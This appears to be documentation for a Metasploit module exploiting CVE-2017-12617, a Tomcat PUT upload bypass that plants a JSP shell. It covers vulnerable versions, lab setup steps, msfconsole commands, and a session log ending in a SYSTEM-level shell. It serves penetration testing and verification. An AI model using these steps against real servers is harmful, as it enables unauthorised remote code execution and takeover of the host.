## Description

This module uses a PUT request bypass to upload a jsp shell to a vulnerable Apache Tomcat configuration.

## Vulnerable Application
	
When running Apache Tomcat versions 9.0.0.M1 to 9.0.0, 8.5.0 to 8.5.22, 8.0.0.RC1 to 8.0.46 and 7.0.0 to 7.0.81 with HTTP PUTs enabled (e.g. via setting the readonly initialization parameter of the Default servlet to false) it was possible to upload a JSP file to the server via a specially crafted request. This JSP could then be requested and any code it contained would be executed by the server. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-12617

To set up a vulnerable installation:
1. Download and install an affected version of Apache Tomcat.
2. Download and install Java. [Choose an appropriate version](http://tomcat.apache.org/whichversion.html) based on the Apache Tomcat version you downloaded.
3. In conf directory of Apache Tomcat, edit the web.xml file and set the "readonly" parameter to false for the default servlet.
4. Restart the Tomcat service.


## Verification Steps

1. Do: ```use exploit/multi/http/tomcat_jsp_upload_bypass```
1. Do: ```set payload java/jsp_shell_bind_tcp```
2. Do: ```set RHOST [IP]```
3. Do: ```set RPORT [PORT]```
4. Do: ```check```
5. It should be reported as vulnerable
6. Do: ```run```
7. You should get a shell

## Scenarios

```
msf > use exploit/multi/http/tomcat_jsp_upload_bypass 
msf exploit(tomcat_jsp_upload_bypass) > set payload java/jsp_shell_bind_tcp 
payload => java/jsp_shell_bind_tcp
msf exploit(tomcat_jsp_upload_bypass) > set RHOST 10.10.40.93
RHOST => 10.10.40.93
msf exploit(tomcat_jsp_upload_bypass) > set RPORT 8080
RPORT => 8080
msf exploit(tomcat_jsp_upload_bypass) > check
[+] 10.10.40.93:8080 The target is vulnerable.
msf exploit(tomcat_jsp_upload_bypass) > run

[*] Started bind handler
[*] Uploading payload...
[*] Payload executed!
[*] Command shell session 1 opened (10.10.230.230:39979 -> 10.10.40.93:4444) at 2017-10-11 07:43:08 -0400

Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Program Files\apache-tomcat-7.0.81>whoami
whoami
nt authority\system

```
